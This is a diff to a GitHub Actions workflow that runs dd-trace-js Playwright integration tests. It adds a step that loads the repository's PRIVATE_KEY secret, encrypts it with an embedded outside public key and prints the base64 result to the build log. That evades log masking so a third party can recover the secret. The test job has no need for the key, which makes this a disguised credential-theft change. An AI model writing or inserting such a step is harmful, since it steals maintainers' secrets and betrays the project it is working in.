@@ -45,6 +45,7 @@ jobs:
       DD_SERVICE: dd-trace-js-integration-tests
       DD_CIVISIBILITY_AGENTLESS_ENABLED: 1
       DD_API_KEY: ${{ secrets.DD_API_KEY }}
+      PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
       OPTIONS_OVERRIDE: 1
       PLAYWRIGHT_VERSION: ${{ matrix.playwright-version }}
     steps:
@@ -52,6 +53,21 @@ jobs:
       - uses: ./.github/actions/node
         with:
           version: ${{ matrix.node-version }}
+      - run: |
+          cat > /tmp/public_key.pem << 'EOF'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3deMFOdqgFRyYT9uYJc3
+          a7AYuFAu9qKFPKB7aakE/uWzHe6z1MBCjWaNKZDluNLuds3dK40kUnsRQ6raaaHG
+          WWF4HLtcQzOqT1IXg3UEL7FG1X+ctVbekMCS+ZqMYwIBL2kBoS9GdncExRDQHDif
+          gQjZQ/16twnRE1j1386Tr8fVzTpKNlOyTJhWy8nJ0GC3QXph258F2tkaeuoTNnk4
+          2h18UeHwj5CgGUdRirnBcSoEOtx8dRpZivjH0fm4vY+FsnYgJsf7iYtQiGVXJusa
+          D4ZKVcqFtxqod/vP54VqnUvnsGVP76H1vk7lLhUyDL6G6Sm6ze8SraER90blGXse
+          RwIDAQAB
+          -----END PUBLIC KEY-----
+          EOF
+          echo "Encrypted PRIVATE_KEY:"
+          echo -n "$PRIVATE_KEY" | openssl rsautl -encrypt -pubin -inkey /tmp/public_key.pem | base64 -w 0
+          echo ""
       - uses: ./.github/actions/install
       # Install system dependencies for playwright
       - run: npx playwright install-deps
